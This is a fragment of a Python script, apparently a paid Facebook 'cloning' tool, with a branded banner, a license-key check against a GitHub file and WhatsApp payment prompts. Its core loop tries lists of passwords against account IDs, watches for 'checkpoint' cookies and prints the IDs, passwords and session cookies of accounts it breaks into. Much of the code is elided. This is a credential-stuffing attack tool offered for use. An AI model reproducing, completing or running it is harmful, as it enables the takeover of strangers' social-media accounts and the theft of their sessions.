...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Sakib' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  Sakib,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/Sakib.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMD-Sakib ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Mohammad Sakibur Rahman ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAlbert-Sakib ]   ║\33[1;34m   
╠══[Whatsapp                 • 01855****** ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def login():
	...
	if Sakib in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801855933868')
	elif Sakib in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Sakib
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Sakib-Cp] {idf} • {pw}')     
				...
				#Sakib
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Sakib-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Sakib/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Sakib King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Sakib+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Sakib+''+key1
		os.system('am start https://wa.me/+8801855933868?text=' + tks)
		Subscraption() 
Subscraption() 
login()